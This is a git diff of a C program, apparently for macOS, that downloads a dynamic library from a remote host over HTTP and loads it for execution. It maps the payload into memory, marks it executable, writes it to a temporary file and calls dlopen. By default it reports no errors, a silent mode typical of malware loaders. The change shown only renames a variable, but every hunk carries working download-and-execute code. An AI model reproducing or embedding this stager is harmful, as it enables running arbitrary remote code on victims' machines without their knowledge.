@@ -241,7 +241,7 @@ struct Memory download_dylib(const char *hostname, const char *path) {
     send_http_get_request(sockfd, hostname, path);
     #endif
 
-    struct Memory mem = {0};
+    struct Memory global_mem = {0};
 
     char buffer[BUFFER_SIZE];
     ssize_t bytes_read;
@@ -255,30 +255,30 @@ struct Memory download_dylib(const char *hostname, const char *path) {
                 size_t header_size = header_end - buffer + 4;
                 size_t content_size = bytes_read - header_size;
 
-                mem.data = malloc(content_size);
-                if (!mem.data) {
+                global_mem.data = malloc(content_size);
+                if (!global_mem.data) {
                     #ifdef VERBOSE
                     perror("malloc failed");
                     #endif
                     close(sockfd);
                     exit(1);
                 }
-                memcpy(mem.data, header_end + 4, content_size);
-                mem.size = content_size;
+                memcpy(global_mem.data, header_end + 4, content_size);
+                global_mem.size = content_size;
 
                 header_parsed = 1;
             }
         } else {
-            mem.data = realloc(mem.data, mem.size + bytes_read);
-            if (!mem.data) {
+            global_mem.data = realloc(global_mem.data, global_mem.size + bytes_read);
+            if (!global_mem.data) {
                 #ifdef VERBOSE
                 perror("realloc failed");
                 #endif
                 close(sockfd);
                 exit(1);
             }
-            memcpy(mem.data + mem.size, buffer, bytes_read);
-            mem.size += bytes_read;
+            memcpy(global_mem.data + global_mem.size, buffer, bytes_read);
+            global_mem.size += bytes_read;
         }
     }
 
@@ -289,11 +289,11 @@ struct Memory download_dylib(const char *hostname, const char *path) {
     }
 
     close(sockfd);
-    return mem;
+    return global_mem;
 }
 
-void *load_dylib_from_memory(struct Memory *mem) {
-    void *mem_fd = mmap(NULL, mem->size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+void *load_dylib_from_memory(struct Memory *global_mem) {
+    void *mem_fd = mmap(NULL, global_mem->size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
     if (mem_fd == MAP_FAILED) {
         #ifdef VERBOSE
         perror("mmap failed");
@@ -301,9 +301,9 @@ void *load_dylib_from_memory(struct Memory *mem) {
         return NULL;
     }
 
-    memcpy(mem_fd, mem->data, mem->size);
+    memcpy(mem_fd, global_mem->data, global_mem->size);
 
-    if (mprotect(mem_fd, mem->size, PROT_READ | PROT_EXEC) == -1) {
+    if (mprotect(mem_fd, global_mem->size, PROT_READ | PROT_EXEC) == -1) {
         #ifdef VERBOSE
         perror("mprotect failed");
         #endif
@@ -320,7 +320,7 @@ void *load_dylib_from_memory(struct Memory *mem) {
         return NULL;
     }
 
-    write(fd, mem->data, mem->size);
+    write(fd, global_mem->data, global_mem->size);
     lseek(fd, 0, SEEK_SET);
 
     void *handle = dlopen(temp_filename, RTLD_NOW | RTLD_LOCAL);
@@ -345,8 +345,8 @@ int main() {
     #ifdef VERBOSE
     printf("Downloading dylib from http://%s%s...\n", hostname, path);
     #endif
-    struct Memory mem = download_dylib(hostname, path);
-    if (mem.data == NULL || mem.size == 0) {
+    struct Memory global_mem = download_dylib(hostname, path);
+    if (global_mem.data == NULL || global_mem.size == 0) {
         #ifdef VERBOSE
         fprintf(stderr, "Failed to download the dylib\n");
         #endif
@@ -354,15 +354,15 @@ int main() {
     }
 
     #ifdef VERBOSE
-    printf("Downloaded %lu bytes\n", mem.size);
+    printf("Downloaded %lu bytes\n", global_mem.size);
     #endif
 
-    void *handle = load_dylib_from_memory(&mem);
+    void *handle = load_dylib_from_memory(&global_mem);
     if (!handle) {
         #ifdef VERBOSE
         fprintf(stderr, "Failed to load dylib from memory\n");
         #endif
-        free(mem.data);
+        free(global_mem.data);
         return 1;
     }
 
@@ -379,6 +379,6 @@ int main() {
     }
 
     dlclose(handle);
-    free(mem.data);
+    free(global_mem.data);
     return 0;
 }
